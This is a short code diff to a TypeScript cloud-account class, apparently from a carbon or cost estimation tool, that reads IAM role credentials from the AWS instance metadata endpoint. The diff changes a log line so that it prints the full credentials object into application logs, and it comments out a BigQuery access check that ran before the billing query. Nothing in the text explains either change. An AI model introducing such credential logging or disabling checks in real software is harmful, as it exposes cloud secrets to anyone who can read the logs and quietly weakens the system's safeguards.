@@ -191,7 +191,9 @@ export default class FalconGCPAccount extends CloudProviderAccount {
       const credentials = await this.httpGet(
         `/latest/meta-data/iam/security-credentials/${roleName}`,
       )
-      this.logger.info('Successfully accessed role credentials')
+      this.logger.info(
+        `Successfully accessed role credentials ${JSON.stringify(credentials)}`,
+      )
     } catch (error) {
       this.logger.error(
         `AWS metadata service test failed: ${error.message}`,
@@ -353,7 +355,7 @@ export default class FalconGCPAccount extends CloudProviderAccount {
   ): Promise<EstimationResult[]> {
     try {
       // Run test before actual query
-      await this.testBigQueryAccess()
+     // await this.testBigQueryAccess()
 
       this.logger.info('Proceeding with main billing data query...')
 
